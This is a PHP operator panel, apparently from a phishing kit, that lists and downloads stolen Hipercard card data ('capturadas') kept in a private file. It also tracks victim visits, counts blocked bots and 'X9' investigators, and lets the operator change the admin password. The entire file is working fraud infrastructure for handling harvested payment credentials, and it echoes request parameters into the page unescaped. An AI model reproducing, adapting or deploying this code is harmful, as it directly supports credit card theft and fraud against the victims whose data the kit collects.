<?php error_reporting(0); $linhas = []; if (md5($_GET['password']) != file_get_contents('password.private.config')) { exit(); } function myFilter($var){ return ($var !== NULL && $var !== FALSE && $var !== ""); } $acessos = substr_count(file_get_contents('infos.txt'), '0'); $infos = file('hipercard.capturadas.private'); if (!$infos) { $infos = []; } $infos = array_map('trim', $infos); $infos = array_filter($infos, "myFilter"); ?> <!DOCTYPE html><html><head><title>Painel</title><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"> <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script> <script type="text/javascript">function remove(id){var elems=document.querySelectorAll('[id^="id_"]');for(var i=0;i<elems.length;i++){elems[i].disabled=true;} $.get('remove.php?id='+id+'&password=<?php echo $_GET["password"];?>');window.location.reload(false)} function reset(){$.get('reset.php'+'?password=<?php echo $_GET["password"];?>');window.location.reload(false)} var forDownload=<?php echo json_encode(array_map('base64_decode',$infos));?>;function doDownload(){function dataUrl(data){return"data:x-application/xml;charset=utf-8,"+escape(data);} var downloadLink=document.createElement("a");downloadLink.href=dataUrl(forDownload.join("n"));downloadLink.download="Capturadas.txt";document.body.appendChild(downloadLink);downloadLink.click();document.body.removeChild(downloadLink);} function reset2(){$.get('reset2.php'+'?password=<?php echo $_GET["password"];?>');setTimeout(()=>{window.location.reload(false)},500)} function cng(){var novasenha=prompt('Digite a nova senha:');$.get('cng.php'+'?password=<?php echo $_GET["password"];?>&new='+novasenha);setTimeout(()=>{window.location='admpanel.php?password='+novasenha;},500)}</script> </head><body><div class="panel panel-default"><div class="panel-heading"><h3 class="panel-title"><span class="label label-success">Acessos: <?php echo $acessos; ?> (X9 Bloqueados: <?php echo count(file('x9s.txt')); ?>)</span>&nbsp;<span class="label label-success">Bots Bloqueados: <?php echo substr_count(file_get_contents('bots.txt'), '0'); ?> - Tentativas de X9: <?php echo substr_count(file_get_contents('tenx9.txt'), '0'); ?></span>&nbsp;<a class='label label-success' onclick="reset()" style="color: white;">Resetar acessos</a>&nbsp;<a class='label label-success' onclick="reset2()" style="color: white;">Resetar X9</a>&nbsp;<span class="label label-success">Infos: <?php echo count($infos); ?></span>&nbsp;<a class='label label-success' onclick="doDownload(forDownload)" style="color: white;">Salvar infos</a>&nbsp;<a class='label label-success' onclick="cng()" style="color: white;">Alterar senha ADMIN</a></h3></div><div class="panel-body"><table class="table"><thead><tr><th scope="col">#</th><th scope="col">Info</th><th scope="col"></th></tr></thead><tbody> <?php $i = 0; foreach ($infos as $info) { $id = $i; $linhas[$i] = $info; $i++; echo '<tr><th scope="row">'.$i.'</th><td>'.base64_decode($info).'</td><td><button id="id_" onclick="remove('.$id.')" type="button" class="btn btn-primary btn-sm">Remover</button></td></tr>'; }?></tbody></table></div></div></body></html>